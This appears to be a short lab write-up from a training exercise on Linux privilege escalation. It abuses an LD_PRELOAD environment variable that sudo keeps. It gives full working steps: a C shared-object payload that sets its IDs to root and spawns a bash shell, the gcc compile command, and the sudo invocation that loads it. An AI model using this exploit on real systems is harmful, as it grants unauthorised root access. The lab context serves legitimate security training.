**Detection**

Linux VM

1. In command prompt type: **sudo -l**

![[Pasted image 20240601215259.png]]

2. From the output, notice that the **LD_PRELOAD** environment variable is intact.

**Exploitation**

1. Open a text editor and type:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```


2. Save the file as x.c

3. In command prompt type:

```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```

4. In command prompt type:

```
sudo LD_PRELOAD=/tmp/x.so apache2
```

5. In command prompt type: 
```
id
```

![[Pasted image 20240601215801.png]]

Answer the questions below

Click 'Completed' once you have successfully elevated the machine
